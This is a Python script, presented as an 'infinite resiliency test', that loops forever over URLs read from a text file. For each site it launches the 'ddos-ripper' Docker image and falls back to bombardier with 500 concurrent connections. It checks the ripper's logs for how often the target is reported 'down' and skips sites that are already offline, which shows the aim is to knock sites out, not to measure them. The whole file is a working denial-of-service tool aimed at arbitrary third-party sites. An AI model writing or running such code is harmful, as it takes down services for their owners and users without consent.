import time
import traceback

import docker
import requests
from docker.errors import NotFound
from docker.models.containers import Container
from requests import ReadTimeout
from requests.exceptions import ConnectionError
from timeout_decorator import timeout_decorator


class DockerSetup(object):
    def __init__(self):
        self.command = None
        self.image = None

    def get_image(self) -> str:
        return self.image

    def get_command(self) -> str:
        return self.command


class BombardierSetup(DockerSetup):
    def __init__(self, duration: int, request_timeout: int, test_url: str):
        super().__init__()
        self.image = 'alpine/bombardier'
        self.command = f"-c 500 --duration {duration}s --timeout={request_timeout}s -l {test_url}"


class RipperSetup(DockerSetup):
    def __init__(self, duration: int, request_timeout: int, test_url: str):
        super().__init__()
        self.image = 'nitupkcuf/ddos-ripper'
        self.command = "www." + test_url.replace("http://", "").replace("https://", "")


class DockerWrapper(object):
    """Move docker methods into a separate class"""

    def __init__(self, docker_setup: DockerSetup):
        self.docker_setup = docker_setup
        self.container_id = None

    def run_container_attached(self) -> str:
        """ Run docker container and return final decoded logs

        :return:
        """
        client = self._get_docker_client()

        return client.containers.run(
            image=self.docker_setup.get_image(),
            tty=True,
            command=self.docker_setup.get_command(),
            detach=False,
            remove=True,
        ).decode("utf-8")

    @staticmethod
    def _get_docker_client():
        return docker.from_env()

    def run_docker_detached(self) -> str:
        """ Run detached docker container and return its id

        :return:
        """
        client = self._get_docker_client()

        self.container_id = client.containers.run(
            image=self.docker_setup.get_image(),
            tty=True,
            command=self.docker_setup.get_command(),
            detach=True,
            remove=True,
        ).id

        return self.container_id

    def get_detached_container_logs(self) -> str:
        """ Get current logs of container per its id

        :return:
        """
        container = self.get_container()
        container_logs = container.logs().decode('utf-8')
        return container_logs

    def get_container(self) -> Container:
        """ Self evident

        :param docker_id:
        :return:
        """
        return self._get_docker_client().containers.get(self.container_id)

    def container_is_running(self) -> bool:
        """ Self evident

        :return:
        """
        return self.get_container() is not None

    def stop(self) -> bool:
        """ Self evident

        :return:
        """
        return self.get_container().stop()


def start_the_infinite_resiliency_test(duration=300):
    """
    Load test all urls from file if they are active
    Load test for each URL has a given time out
    :param duration:
    """
    cycle = 1
    while True:
        lines = _read_file_lines()
        for test_url in lines:
            test_url = test_url.rstrip("\n")
            _load_test_the_url(test_url, duration)

        print(f"finished {cycle} cycle")
        cycle += 1


def _load_test_the_url(test_url, duration):
    try:
        requests.get(test_url, timeout=30)
        _load_test_the_url_with_700s_timeout(test_url, duration)

    except (ConnectionError, ReadTimeout) as e:
        print(f"{test_url} is already down")

    except TimeoutError as e:
        print(f"{test_url} load test took over 700 seconds")

    except Exception as e:
        print(f"failed to process {test_url}")
        print(traceback.format_exc())


def _print_bombardier_stats(log: str):
    print_line = False
    text_to_print = ""
    lines = log.split("\n")
    for line in lines:
        if "Statistics" in line:
            print_line = True
        if "Errors:" in line:
            print(text_to_print)
            break
        if print_line:
            text_to_print += line + "\n"


def _run_the_test(test_url: str, duration: int):
    start = time.time()
    do_ripper = True
    ripper_setup = RipperSetup(
        duration=duration,
        request_timeout=30,
        test_url=test_url
    )

    print(f"Start ripper for {test_url}")
    docker_wrapper = DockerWrapper(ripper_setup)
    docker_wrapper.run_docker_detached()

    try:
        while time.time() - start < duration and do_ripper:
            time.sleep(10)
            container_logs = docker_wrapper.get_detached_container_logs()
            count_rippering = container_logs.count("rippering")
            count_down = container_logs.count("down")

            if count_down / count_rippering > 0.5:
                do_ripper = False

        if docker_wrapper.container_is_running():
            docker_wrapper.stop()

        print(f"Stopped ripper for {test_url}")

    except NotFound as e:
        print(f"Failed to ripper {test_url}")

        new_duration = duration - (time.time() - start) - 1

        if new_duration > 1:
            print(f"Start bombardier for {test_url}")
            bombardier_setup = BombardierSetup(
                duration=int(new_duration),
                request_timeout=30,
                test_url=test_url,
            )

            decoded_container_log = DockerWrapper(bombardier_setup).run_container_attached()
            _print_bombardier_stats(decoded_container_log)


@timeout_decorator.timeout(700, timeout_exception=TimeoutError)
def _load_test_the_url_with_700s_timeout(test_url, duration):
    print(f"Start Testing {test_url}")
    _run_the_test(test_url, duration)
    print(f"Finished testing {test_url}")


def _read_file_lines():
    file1 = open('urls_list.txt', 'r')
    lines = file1.readlines()
    return lines


if __name__ == '__main__':
    start_the_infinite_resiliency_test(duration=600)
